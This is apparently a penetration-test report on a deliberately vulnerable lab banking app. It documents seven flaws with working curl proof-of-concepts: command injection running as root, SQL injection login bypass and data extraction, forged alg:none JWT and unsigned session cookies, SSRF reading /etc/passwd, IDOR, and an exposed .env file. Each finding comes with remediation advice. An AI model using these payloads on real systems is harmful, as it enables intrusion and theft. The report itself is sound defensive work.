# Vulnerability Assessment — http://172.17.0.3:5000 (OWASP StonksBank)

## Executive Summary

The target Flask application (`Werkzeug/3.1.8 Python/3.12.14`) exposes seven independently confirmed, actively exploited vulnerabilities spanning authentication, injection, access control, and SSRF. Two yield unauthenticated remote code execution as **root** and full database read; the remainder allow privilege escalation to admin, arbitrary account access, secret disclosure, and internal-service/file exfiltration. Every finding below was demonstrated against the in-scope host with a working proof-of-concept and captured response evidence.

| # | Finding | Severity | CWE |
|---|---------|----------|-----|
| 1 | OS command injection in `/tools/ping` (RCE as root) | Critical | CWE-78 |
| 2 | SQL injection in `/login` (auth bypass + data exfil) | Critical | CWE-89 |
| 3 | JWT `alg:none` accepted in `/admin` (auth bypass) | Critical | CWE-347 |
| 4 | Unsigned `session` cookie in `/vip` (role forgery) | High | CWE-347 |
| 5 | SSRF + `file://` read in `/fetch` | High | CWE-918 |
| 6 | IDOR in `/api/account/<id>` (unauth account read) | High | CWE-639 |
| 7 | Exposed `.env` secret backup | Medium | CWE-16 |

---

### 1. OS Command Injection in `/tools/ping?host=` allows unauthenticated RCE as root

- **Severity:** Critical — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8)
- **CWE:** CWE-78 — Improper Neutralization of Special Elements used in an OS Command
- **Affected asset:** `GET http://172.17.0.3:5000/tools/ping` — parameter `host`
- **Summary:** The `host` parameter is concatenated into a shell command with no sanitization, letting any anonymous visitor run arbitrary commands on the server as root.
- **Steps to Reproduce:**
  1. Send: `curl -is "http://172.17.0.3:5000/tools/ping?host=127.0.0.1;id;cat%20/flag*"`
  2. Observed response body:
     ```
     /bin/sh: 1: ping: not found
     uid=0(root) gid=0(root) groups=0(root)
     flag{a03_command_injection}
     ```
  3. The injected `id` executed as `uid=0(root)` and `cat /flag*` read a protected file — confirming arbitrary command execution.
- **Impact:** Full server compromise (root). Attacker can read/modify any file, pivot to internal networks, and destroy or exfiltrate all data. Chains with finding #5 to reach further internal assets.
- **Remediation:** Never invoke a shell with user input. Call the binary directly with an argument list (`subprocess.check_output(["ping","-c1","-W1", host])`, `shell=False`) and validate `host` against a strict hostname/IP allowlist. Drop root privileges for the service.
- **References:** https://cwe.mitre.org/data/definitions/78.html · OWASP A03:2021 Injection

---

### 2. SQL Injection in `/login?user=` allows authentication bypass and full database read

- **Severity:** Critical — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8)
- **CWE:** CWE-89 — Improper Neutralization of Special Elements used in an SQL Command
- **Affected asset:** `GET http://172.17.0.3:5000/login` — parameters `user`, `pass`
- **Summary:** The `user` value is string-formatted directly into a SQL query, allowing anyone to bypass login and extract arbitrary data from the database.
- **Steps to Reproduce:**
  1. Auth bypass — `curl -s "http://172.17.0.3:5000/login?user=admin'--%20&pass=x"` → returns `Welcome!` (comment terminates the password check).
  2. Baseline negative — `user=x'%20OR%20'1'='1&pass=x` behavior differs from valid rows, confirming query control.
  3. Boolean-blind exfiltration of a secret in a *different* table (`notes`):
     - `user=z' UNION SELECT 1,2,3 FROM notes WHERE substr(flag,1,9)='flag{a03_'-- ` → `Welcome!` (condition true)
     - Full-value confirm: `user=z' UNION SELECT 1,2,3 FROM notes WHERE flag='flag{a03_sqli_union_dump}'-- ` → `Welcome!`
  4. Extracted secret: `flag{a03_sqli_union_dump}`.
- **Impact:** Complete credential store and database disclosure, authentication bypass, and (via stacked/UNION queries) tampering. Any user account can be impersonated.
- **Remediation:** Use parameterized queries / bound parameters exclusively (`c.execute("SELECT * FROM users WHERE user=? AND pass=?", (u, p))`). Never format user input into SQL strings.
- **References:** https://cwe.mitre.org/data/definitions/89.html · OWASP A03:2021 Injection

---

### 3. JWT `alg:none` Accepted in `/admin` allows authentication bypass to admin

- **Severity:** Critical — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` (9.1)
- **CWE:** CWE-347 — Improper Verification of Cryptographic Signature
- **Affected asset:** `GET http://172.17.0.3:5000/admin` — `token` cookie (or `token` query param)
- **Summary:** The admin endpoint decodes JWTs with signature verification disabled and permits the `none` algorithm, so anyone can mint an unsigned admin token.
- **Steps to Reproduce:**
  1. Craft header `{"alg":"none","typ":"JWT"}` and payload `{"role":"admin"}`, base64url-encode both, leave the signature empty:
     `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.`
  2. Send: `curl -is "http://172.17.0.3:5000/admin" -H "Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ."`
  3. Observed response: `admin panel. flag{a07_jwt_alg_none}`
- **Impact:** Any unauthenticated attacker gains full administrative access without knowing any signing key.
- **Remediation:** Verify signatures (`jwt.decode(tok, key, algorithms=["HS256"])`) with `verify_signature=True`; explicitly reject `none` and never include it in the accepted algorithm list.
- **References:** https://cwe.mitre.org/data/definitions/347.html · OWASP A07:2021 Identification and Authentication Failures

---

### 4. Unsigned `session` Cookie in `/vip` allows role forgery to admin

- **Severity:** High — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` (8.2)
- **CWE:** CWE-347 — Improper Verification of Cryptographic Signature (integrity-less token)
- **Affected asset:** `GET http://172.17.0.3:5000/vip` — `session` cookie
- **Summary:** The session cookie is plain `base64(JSON)` with no signature, so a user can rewrite their own role to `admin` and access members-only functionality.
- **Steps to Reproduce:**
  1. Build a forged cookie: `printf '{"user":"admin","role":"admin"}' | base64` → `eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ==`
  2. Send: `curl -is "http://172.17.0.3:5000/vip" -H "Cookie: session=eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ=="`
  3. Observed response: `Welcome VIP admin. flag{a02_unsigned_token_forged}`
- **Impact:** Trivial client-side privilege escalation; any user can assume any identity/role the app trusts in the cookie.
- **Remediation:** Use integrity-protected sessions — Flask signed sessions (`itsdangerous`) or server-side session storage with an opaque random ID. Never trust client-supplied role claims.
- **References:** https://cwe.mitre.org/data/definitions/347.html · OWASP A02:2021 Cryptographic Failures

---

### 5. SSRF and `file://` Read in `/fetch?url=` allows internal-service access and local file disclosure

- **Severity:** High — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` (8.2)
- **CWE:** CWE-918 — Server-Side Request Forgery
- **Affected asset:** `GET http://172.17.0.3:5000/fetch` — parameter `url`
- **Summary:** The endpoint fetches any attacker-supplied URL with no scheme or destination restrictions, exposing localhost-only services and, via `file://`, arbitrary local files.
- **Steps to Reproduce:**
  1. Reach a loopback-gated internal endpoint (returns `forbidden` when requested directly):
     `curl -s "http://172.17.0.3:5000/fetch?url=http://127.0.0.1:5000/internal/flag"` → `flag{a10_ssrf_internal}`
  2. Confirm the endpoint is otherwise blocked: direct `curl -s "http://172.17.0.3:5000/internal/flag"` → `forbidden: internal endpoint`
  3. Arbitrary file read: `curl -s "http://172.17.0.3:5000/fetch?url=file:///etc/passwd"` → returns `root:x:0:0:root:/root:/bin/bash ...`
  4. Source disclosure (amplifier): `url=file:///proc/self/cwd/owasp_web.py` returned the full application source, exposing all hardcoded secrets and logic.
- **Impact:** Bypasses network-level trust to reach internal-only services, cloud metadata endpoints, and read arbitrary local files (config, keys, source). The source disclosure here directly enabled reconstruction of every other finding.
- **Remediation:** Allowlist permitted schemes (`http`/`https` only — block `file://`, `gopher://`, etc.) and destination hosts; resolve and reject private/loopback/link-local ranges; disable following redirects into blocked ranges.
- **References:** https://cwe.mitre.org/data/definitions/918.html · OWASP A10:2021 Server-Side Request Forgery

---

### 6. IDOR in `/api/account/<id>` allows unauthenticated access to any account

- **Severity:** High — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (7.5)
- **CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key
- **Affected asset:** `GET http://172.17.0.3:5000/api/account/<id>`
- **Summary:** Account records are returned by numeric ID with no authentication or ownership check, so anyone can enumerate and read every account.
- **Steps to Reproduce:**
  1. `curl -s "http://172.17.0.3:5000/api/account/1"` → `{"user": "admin", "balance": 999999, "flag": "flag{a01_idor_broken_access}"}`
  2. `curl -s "http://172.17.0.3:5000/api/account/2"` → `{"user": "guest", "balance": 12}`
  3. Sequential IDs return distinct users' data with no credentials supplied.
- **Impact:** Full disclosure of all customer account data (identities, balances) by trivial ID enumeration.
- **Remediation:** Require authentication and enforce per-object authorization — verify the requester is permitted to view the requested account before returning data.
- **References:** https://cwe.mitre.org/data/definitions/639.html · OWASP A01:2021 Broken Access Control

---

### 7. Exposed `.env` Backup discloses application secrets

- **Severity:** Medium — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (7.5)
- **CWE:** CWE-16 — Configuration (sensitive files served / debug enabled)
- **Affected asset:** `GET http://172.17.0.3:5000/.env`
- **Summary:** A `.env` file containing an admin token and debug flag is served directly to the public, leaking secrets and confirming a production instance running in debug mode.
- **Steps to Reproduce:**
  1. `curl -s "http://172.17.0.3:5000/.env"`
  2. Observed response:
     ```
     APP_ENV=prod
     DEBUG=1
     ADMIN_TOKEN=flag{a05_exposed_dotenv}
     ```
- **Impact:** Discloses an administrative secret and confirms `DEBUG=1` in production (which, with Werkzeug, can enable the interactive debugger / further code execution). Leaked secrets aid further compromise.
- **Remediation:** Keep secrets outside the web root; block serving of dotfiles at the server/WSGI layer; set `DEBUG=0` in production; rotate any exposed token.
- **References:** https://cwe.mitre.org/data/definitions/16.html · OWASP A05:2021 Security Misconfiguration

---

## Coordinated Disclosure

This assessment was performed against an authorized, in-scope lab target only, non-destructively and within rate limits. Please treat this report as confidential: no public disclosure before a fix is deployed. I request acknowledgement of receipt and will hold to a standard **90-day** disclosure window, extendable by mutual agreement if remediation is in progress. Findings #1 (root RCE) and #2/#3 (auth bypass) should be prioritized for immediate remediation.